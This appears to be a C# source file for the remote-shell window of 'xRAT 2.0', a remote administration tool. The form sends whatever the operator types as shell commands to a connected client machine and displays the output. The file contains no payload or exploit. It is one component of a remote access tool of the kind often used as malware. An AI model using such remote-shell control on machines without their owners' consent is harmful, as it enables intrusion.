using System;
using System.Windows.Forms;
using xServer.Core;
using xServer.Core.Packets.ServerPackets;

namespace xServer.Forms
{
    public partial class FrmRemoteShell : Form
    {
        private readonly Client _connectClient;

        public FrmRemoteShell(Client c)
        {
            _connectClient = c;
            _connectClient.Value.FrmRs = this;

            InitializeComponent();

            txtConsoleOutput.Text = ">> Type 'exit' to close this session" + Environment.NewLine;
        }

        private void FrmRemoteShell_Load(object sender, EventArgs e)
        {
            if (_connectClient != null)
                Text = string.Format("xRAT 2.0 - Remote Shell [{0}:{1}]", _connectClient.EndPoint.Address,
                    _connectClient.EndPoint.Port);
        }

        private void FrmRemoteShell_FormClosing(object sender, FormClosingEventArgs e)
        {
            new ShellCommand("exit").Execute(_connectClient);
            if (_connectClient.Value != null)
                _connectClient.Value.FrmRs = null;
        }

        private void txtConsoleOutput_TextChanged(object sender, EventArgs e)
        {
            txtConsoleOutput.SelectionStart = txtConsoleOutput.TextLength;
            txtConsoleOutput.ScrollToCaret();
        }

        private void txtConsoleInput_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter && !string.IsNullOrEmpty(txtConsoleInput.Text.Trim()))
            {
                var input = txtConsoleInput.Text;
                txtConsoleInput.Text = string.Empty;

                switch (input)
                {
                    case "cls":
                        txtConsoleOutput.Text = string.Empty;
                        break;

                    case "exit":
                        new ShellCommand(input).Execute(_connectClient);
                        Close();
                        break;

                    default:
                        new ShellCommand(input).Execute(_connectClient);
                        break;
                }

                e.Handled = true;
                e.SuppressKeyPress = true;
            }
        }

        private void txtConsoleOutput_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (e.KeyChar != (char) 2)
            {
                txtConsoleInput.Text += e.KeyChar.ToString();
                txtConsoleInput.Focus();
                txtConsoleInput.SelectionStart = txtConsoleOutput.TextLength;
                txtConsoleInput.ScrollToCaret();
            }
        }
    }
}